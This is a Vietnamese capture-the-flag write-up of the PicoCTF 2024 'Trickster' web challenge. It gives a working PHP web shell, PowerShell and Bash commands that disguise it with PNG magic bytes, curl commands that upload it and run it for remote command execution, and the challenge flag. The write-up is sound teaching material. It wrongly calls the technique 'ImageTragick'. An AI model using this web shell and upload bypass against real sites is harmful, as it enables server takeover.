---
title: Trickster
date: 2025-10-27 23:00:00 +0700
categories: [Web Exploitation, PicoCTF 2024, Medium]
tags: [web, pico, medium]
author: khoa
description: I found a web app that can help process images, PNG images only!
toc: true
comments: true
---

## **Cách mình làm**

### Soi web
Vừa vào web thì mình thấy nó cho mình phần upload file như thế này:
![img-description](https://i.ibb.co/tTkXCvyj/image-2025-10-27-224600263.png)
_Sau khi vào web_

Check thử robots.txt xem có gì hot:
![img-description](https://i.ibb.co/Z6nSY62c/image-2025-10-27-224740109.png)
_Robots.txt_

Vậy là mình biết nó có phần /uploads/

### Nghịch
Kỹ thuật mình sẽ sử dụng là ImageTragick!, thêm magic byte của file png vào file .php rồi upload lên cho nó thực thi lệnh (RCE

#### Shell.php
Đầu tiên các bạn cần chuẩn bị 1 file shell.php với nội dung như sau:
```php
<?php system($_GET['cmd']); ?>
```

#### PNG Header
Sau đó các bạn thêm PNG Header vào để nguỵ trang:
##### PowerShell (Windows)
```powershell
[System.IO.File]::WriteAllBytes("shell.php.png", @(0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A))
Get-Content shell.php -Raw | Out-File -Append -Encoding ASCII shell.php.png
```

##### Bash (Linux)
```bash
echo -ne '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.png.php
cat shell.php >> shell.png.php
```

![img-description](https://i.ibb.co/LXN3RZvN/image-2025-10-27-225425603.png)
_Sau khi tạo file nguỵ trang_

#### Upload File

Dùng Burp Suite hoặc curl:
```bash
curl -F 'file=@shell.png.php' http://atlas.picoctf.net:PORT/
```

Khi thành công → file được lưu tại `/uploads/shell.png.php`

![img-description](https://i.ibb.co/QFCYL4QP/image-2025-10-27-225602779.png)
_Sau khi upload file_

#### RCE
Truy cập shell:
```bash
curl "http://atlas.picoctf.net:PORT/uploads/shell.png.php?cmd=whoami"
```

Và mình đã RCE thành công!!!
![img-description](https://i.ibb.co/Lz7HNFcp/image-2025-10-27-225758108.png)
_RCE thành công_

Thử ls quanh quanh thì thấy có cái file txt này lạ lạ:
![img-description](https://i.ibb.co/4wTnM54W/image-2025-10-27-225906341.png)
_ls quanh quanh_

Cat thử thì có flag nè!!!
![img-description](https://i.ibb.co/6JbkrXd4/image-2025-10-27-230025466.png)
_lòi flag_

FLAG: **picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}**

## **Kết luận**
### Bản chất
Đây là một lỗ hỏng upload file, bypass bằng các Magic Bytes của file png, từ đó các bạn có thể thực thi lệnh

### Cách làm
B1: Tạo file png giả, có chứa nội dung của file php để thực thi shell
B2: Upload lên web
B3: Phá!!!

### Tại sao Magic Bytes có thể bypass được và cho phép RCE???
Lý do cốt lõi là sự kiểm tra không đầy đủ.

Hệ thống chỉ quan tâm đến "cái mác" (magic byte) mà bỏ qua hoàn toàn "nội dung" (phần còn lại của tệp). Kẻ tấn công chỉ cần "dán đúng mác" lên một "gói hàng cấm" là có thể vượt qua trạm kiểm soát.

Nói chung là cũng tại thằng dev mà thôi =)))

## **Lời kết**
Chúc các bạn đánh CTF vui vẻ!!!